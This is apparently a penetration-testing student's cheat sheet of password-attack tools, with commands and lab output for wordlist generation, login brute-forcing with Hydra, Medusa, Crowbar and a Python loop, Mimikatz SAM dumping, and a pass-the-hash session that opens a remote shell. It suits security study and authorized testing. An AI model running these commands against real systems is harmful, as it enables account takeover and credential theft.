# Password Attack

## Custom Word List generator (CeWL)

Site: https://digi.ninja/projects/cewl.php

> CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.

## John The Ripper

Site: http://www.openwall.com/john/

> John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems.

```sh
┌──(grenierdev㉿kali)-[~]
└─$ john --wordlist=./pw.txt --rules:Single -stdout
```

## Crunch

Site: https://sourceforge.net/projects/crunch-wordlist/

> Crunch is a wordlist generator where you can specify a standard character set or a character set you specify. crunch can generate all possible combinations and permutations.

```sh
┌──(grenierdev㉿kali)-[~]
└─$ crunch 8 8 -t ,@@^^%%%
Crunch will now generate the following amount of data: 172262376000 bytes
164282 MB
160 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 19140264000 
Aaa!!000
Aaa!!001
Aaa!!002
...
```

## Python itertools

[itertools](https://docs.python.org/3/library/itertools.html) has a function that return an iterator over all permutation of character in a string.

```python
from requests import post
from itertools import permutations

for su in permutations('%&@!#'):
	pw = 'discourse' + ''.join(su)
	res = post('http://192.168.219.68:8080/login-2/index.php', data={'username': 'rdescartes', 'password': pw})
```

## Medusa

Site: http://h.foofus.net/?page_id=51

> Medusa is a speedy, parallel, and modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible. 

```sh
┌──(grenierdev㉿kali)-[~]
└─$ medusa -d
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

  Available modules in "." :

  Available modules in "/usr/lib/x86_64-linux-gnu/medusa/modules" :
    + cvs.mod : Brute force module for CVS sessions : version 2.0
    + ftp.mod : Brute force module for FTP/FTPS sessions : version 2.1
    + http.mod : Brute force module for HTTP : version 2.1
    + imap.mod : Brute force module for IMAP sessions : version 2.0
    + mssql.mod : Brute force module for M$-SQL sessions : version 2.0
    + mysql.mod : Brute force module for MySQL sessions : version 2.0
    + nntp.mod : Brute force module for NNTP sessions : version 2.0
    + pcanywhere.mod : Brute force module for PcAnywhere sessions : version 2.0
    + pop3.mod : Brute force module for POP3 sessions : version 2.0
    + postgres.mod : Brute force module for PostgreSQL sessions : version 2.0
    + rexec.mod : Brute force module for REXEC sessions : version 2.0
    + rlogin.mod : Brute force module for RLOGIN sessions : version 2.0
    + rsh.mod : Brute force module for RSH sessions : version 2.0
    + smbnt.mod : Brute force module for SMB (LM/NTLM/LMv2/NTLMv2) sessions : version 2.1
    + smtp-vrfy.mod : Brute force module for verifying SMTP accounts (VRFY/EXPN/RCPT TO) : version 2.1
    + smtp.mod : Brute force module for SMTP Authentication with TLS : version 2.0
    + snmp.mod : Brute force module for SNMP Community Strings : version 2.1
    + ssh.mod : Brute force module for SSH v2 sessions : version 2.1
    + svn.mod : Brute force module for Subversion sessions : version 2.1
    + telnet.mod : Brute force module for telnet sessions : version 2.0
    + vmauthd.mod : Brute force module for the VMware Authentication Daemon : version 2.0
    + vnc.mod : Brute force module for VNC sessions : version 2.1
    + web-form.mod : Brute force module for web forms : version 2.1
    + wrapper.mod : Generic Wrapper Module : version 2.0
```

## Crowbar

Site: https://github.com/galkan/crowbar

> Crowbar (formally known as Levye) is a brute forcing tool that can be used during penetration tests. It was developed to brute force some protocols in a different manner according to other popular brute forcing tools. Currently Crowbar supports: OpenVPN (-b openvpn), Remote Desktop Protocol (RDP) NLA support (-b rdp), SSH private key authentication (-b sshkey), VNC key authentication (-b vpn).

```sh
┌──(grenierdev㉿kali)-[~]
└─$ crowbar -b rdp -s 192.168.247.10/32 -u admin -C winpw.txt -n 1
2022-04-10 21:03:05 START
2022-04-10 21:03:05 Crowbar v0.4.1
2022-04-10 21:03:05 Trying 192.168.247.10:3389
2022-04-10 21:03:07 RDP-SUCCESS : 192.168.247.10:3389 - admin:lab
2022-04-10 21:03:07 STOP
```

## Hydra

Site: https://github.com/vanhauser-thc/thc-hydra

> THC-Hydra is another powerful network service attack tool under active development and it is worth mastering. We can use it to attack a variety of protocol authentication schemes, including SSH and HTTP. Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

```sh
┌──(grenierdev㉿kali)-[~]
└─$ hydra -l student -P ./pw.txt ssh://192.168.247.44
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-10 21:13:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.168.247.44:22/
[22][ssh] host: 192.168.247.44   login: student   password: lab
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-10 21:13:02
```

## Spray

Site: https://github.com/Greenwolf/Spray

> A Password Spraying tool for Active Directory Credentials

## Mimikatz

```sh
C:\Tools\password_attacks> .\mimikatz.exe
...
mimikatz # privilege::debug
...
mimikatz # token::elevate
...
mimikatz # lsadump::sam
```

## Passing-The-Hash

Site: https://github.com/byt3bl33d3r/pth-toolkit

```sh
┌──(grenierdev㉿kali)-[~]
└─$ pth-winexe -h
winexe version 1.1
This program may be freely redistributed under the terms of the GNU GPLv3
Usage: winexe [OPTION]... //HOST COMMAND
Options:
  -h, --help                                  Display help message
  -V, --version                               Display version number
  -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
  -A, --authentication-file=FILE              Get the credentials from a file
  -N, --no-pass                               Do not ask for a password
  -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]
  -d, --debuglevel=DEBUGLEVEL                 Set debug level
      --uninstall                             Uninstall winexe service after remote execution
      --reinstall                             Reinstall winexe service before remote execution
      --system                                Use SYSTEM account
      --profile                               Load user profile
      --convert                               Try to convert characters between local and remote code-pages
      --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in cleartext over the network!)
      --runas-file=FILE                       Run as user options defined in a file
      --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows requirement). Vista does not support this option.
      --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of service will be installed.

┌──(grenierdev㉿kali)-[~]
└─$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.247.10 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
client251\offsec

C:\Windows\system32>
```

## Hashcat

Site: https://hashcat.net/hashcat/

